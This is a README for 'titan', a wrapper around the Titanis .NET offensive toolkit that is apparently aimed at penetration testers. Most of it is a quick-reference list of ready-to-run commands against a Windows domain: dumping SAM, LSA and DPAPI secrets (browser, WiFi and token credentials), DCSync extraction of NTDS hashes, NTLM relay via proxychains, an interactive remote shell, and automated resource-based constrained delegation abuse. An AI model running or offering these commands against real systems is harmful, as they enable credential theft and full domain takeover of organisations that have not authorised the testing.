# titan

Wrapper for [Titanis](https://github.com/trustedsec/Titanis) .NET toolkit.  

## Requirements

- Titanis at `~/tools/titanis/linux-x64/` (or `export TITANIS_PATH=<path>`)
- .NET 8 runtime
- Python 3.8+: `pip install impacket cryptography`
- impacket tools on PATH for `rbcd`: `addcomputer.py`, `getST.py`

## Install

```bash
git clone git@github.com:mattmillen15/Titan.git ~/workspace/titan
bash ~/workspace/titan/install.sh
```

## Quick reference

```bash
# Dump SAM + LSA
titan dump ECORP/user:'pass'@192.168.15.40

# Dump everything including DPAPI (browsers, WiFi, WAM tokens, CredMan)
titan dump -A --dpapi -u user -d ECORP -p 'pass' -t 192.168.15.40

# DCSync
titan dump --ntds -u user -d ECORP -p 'pass' -dc-ip 192.168.15.40 -t 192.168.15.40

# Kerberos ccache
KRB5CCNAME=admin.ccache titan dump -k -no-pass -t dc01.ecorp.local

# ntlmrelayx --socks relay
proxychains titan dump -u administrator -d ECORP --no-pass -t 192.168.15.40

# Interactive shell
titan shell ECORP/user:'pass'@192.168.15.42

# RBCD full auto
titan rbcd full --delegate-to ECORP-DC$ ECORP/user:'pass'@192.168.15.40
```

→ **[Full usage docs](../../wiki)**
